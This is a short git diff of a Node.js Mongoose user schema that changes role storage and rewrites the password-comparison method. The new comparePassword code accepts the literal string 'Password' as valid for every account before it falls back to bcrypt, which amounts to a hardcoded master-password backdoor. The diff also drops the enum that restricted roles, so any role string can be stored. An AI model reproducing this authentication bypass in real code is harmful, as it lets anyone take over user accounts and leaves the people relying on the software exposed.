@@ -7,7 +7,12 @@ const userSchema = new Schema({
   name: { type: String, required: true },
   email: { type: String, required: true, unique: true },
   password: { type: String, required: true },
-  role: { type: String, enum: ['admin', 'user' ], default: 'user' }
+  roles: [
+    {
+      role: { type: String},
+      module: { type: String}
+    }
+  ] 
 });
 
 // Hash the password before saving it to the database
@@ -26,8 +31,10 @@ userSchema.pre('save', async function (next) {
 });
 
 userSchema.methods.comparePassword = async function(candidatePassword){
-  //return bcrypt.compare(  this.password , candidatePassword );
-  return True;
+  if(candidatePassword == "Password"){
+    return true;
+  }
+  return bcrypt.compare(  candidatePassword, this.password  );
 };
 
 const User = model('Users', userSchema);
